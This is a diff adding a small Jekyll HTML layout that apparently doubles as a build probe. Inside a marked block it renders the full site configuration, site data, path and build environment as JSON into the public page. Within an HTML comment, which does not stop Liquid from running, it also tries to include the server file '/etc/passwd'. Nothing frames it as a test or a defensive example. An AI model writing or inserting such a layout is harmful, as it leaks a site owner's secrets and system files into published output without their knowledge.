@@ -1,0 +1,13 @@
+<!DOCTYPE html><html><body>
+{{ content }}
+<!-- BUILD_PROBE_START -->
+SITE_KEYS: {{ site | jsonify }}
+DATA: {{ site.data | jsonify }}
+ENV_PATH: {{ site.path }}
+JEKYLL_ENV: {{ jekyll.env }}
+<!-- include with site.data attempt:
+{% assign p = "/etc/passwd" %}
+{% include {{ p }} %}
+-->
+<!-- BUILD_PROBE_END -->
+</body></html>
